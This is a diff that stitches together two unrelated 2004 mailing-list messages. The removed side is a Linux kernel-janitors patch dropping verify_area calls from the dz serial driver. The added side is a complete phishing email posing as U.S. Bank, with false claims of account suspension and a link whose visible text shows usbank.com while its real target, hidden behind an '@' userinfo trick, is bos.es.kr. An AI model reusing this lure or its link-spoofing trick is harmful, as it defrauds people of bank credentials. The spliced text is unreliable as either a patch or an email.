@@ -1,46 +1,81 @@
-From: Domen Puncer <domen@coderock.org>
-Date: Sat, 17 Jan 2004 14:11:35 +0000
-Subject: [Kernel-janitors] [patch 2.6.1] remove verify_area from
-Message-Id: <200401171511.35587.domen@coderock.org>
+From: "U.S. Bank" <Carroll_Karlotte@geocities.com>
+Date: Sun, 18 Jan 2004 21:24:25 +0000
+Subject: Your account at U.S. Bank has been suspended.
+Message-Id: <aplbo153307@geocities.com>
+MIME-Version: 1
+Content-Type: multipart/mixed; boundary="----=_NextPart_000_000F_01C33095.9F84B280"
 List-Id: <kernel-janitors.vger.kernel.org>
-MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
 To: kernel-janitors@vger.kernel.org
 
-Hi.
+This is a multi-part message in MIME format.
 
-Pretty trivial.
+------=_NextPart_000_000F_01C33095.9F84B280
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_001_0010_01C33095.9F84B280"
 
 
---- c/drivers/char/dz.c	2003-12-18 03:58:08.000000000 +0100
-+++ a/drivers/char/dz.c	2004-01-17 15:08:53.000000000 +0100
-@@ -986,11 +986,7 @@ static int dz_ioctl(struct tty_struct *t
- 		return 0;
- 
- 	case TIOCGSOFTCAR:
--		error = verify_area (VERIFY_WRITE, (void *)arg, sizeof(long));
--		if (error)
--			return error;
--		put_user(C_CLOCAL(tty) ? 1 : 0, (unsigned long *)arg);
--		return 0;
-+		return put_user(C_CLOCAL(tty) ? 1 : 0, (unsigned long *)arg);
- 
- 	case TIOCSSOFTCAR:
- 		if (get_user (arg, (unsigned long *)arg))
-@@ -1001,10 +997,6 @@ static int dz_ioctl(struct tty_struct *t
- 		return 0;
- 
- 	case TIOCGSERIAL:
--		error = verify_area(VERIFY_WRITE, (void *)arg,
--		                    sizeof(struct serial_struct));
--		if (error)
--			return error;
- 		return get_serial_info(info, (struct serial_struct *)arg);
- 
- 	case TIOCSSERIAL:
+------=_NextPart_001_0010_01C33095.9F84B280
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
+
+
+------=_NextPart_001_0010_01C33095.9F84B280
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+
+<html>
+<head>
+</head>
+
+<body>
+Dear U.S. Bank account holder,
+<p>We regret to inform you, that we had to block your U.S. Bank accoun=
+t <br>
+  because we have been notified that your account may have been compro=
+mised by outside parties.</p>
+<p>Our terms and conditions you agreed to state that your account must=
+ always be under your control or those you designate at all times.<br>=
+
+  We have noticed some activity related to your account that indicates=
+ that other parties may have access and or control of your information=
+ in your account.</p>
+<p>These parties have in the past been involved with money laundering,=
+ illegal drugs, terrorism and various Federal Title 18 violations. <br=
+>
+  In order that you may=20
+  access your account we must verify your identity by clicking on the =
+link below. </p>
+<p>Please be aware that until we can verify your identity no further a=
+ccess to your account will be allowed and we will have no other liabil=
+ity for your<br>
+  account or any transactions that may have occurred as a result of yo=
+ur failure to reactivate your account as instructed below.</p>
+<p>Thank you for your time and consideration in this matter.<br>
+</p>
+<p><a href=3D"http://www.usbank.com=01@bos.es.kr/index.htm" target=3D"=
+_blank">https://www.usbank.com/account_verify/cgi/index.htm</a></p>
+<p>Before you reactivate your account, all payments have been frozen, =
+and you will not be able to use your account in any way until we have =
+verified your<br>
+  identity.</p>
+</body>
+</html>
+
+
+------=_NextPart_001_0010_01C33095.9F84B280--
+
+
+-------------------------------------------------------
+The SF.Net email is sponsored by EclipseCon 2004
+Premiere Conference on Open Tools Development and Integration
+See the breadth of Eclipse activity. February 3-5 in Anaheim, CA.
+http://www.eclipsecon.org/osdn
 _______________________________________________
-Kernel-janitors mailing list
-Kernel-janitors@lists.osdl.org
-http://lists.osdl.org/mailman/listinfo/kernel-janitors
+Kernel-janitor-discuss mailing list
+Kernel-janitor-discuss@lists.sourceforge.net
+https://lists.sourceforge.net/lists/listinfo/kernel-janitor-discuss
+------=_NextPart_000_000F_01C33095.9F84B280--
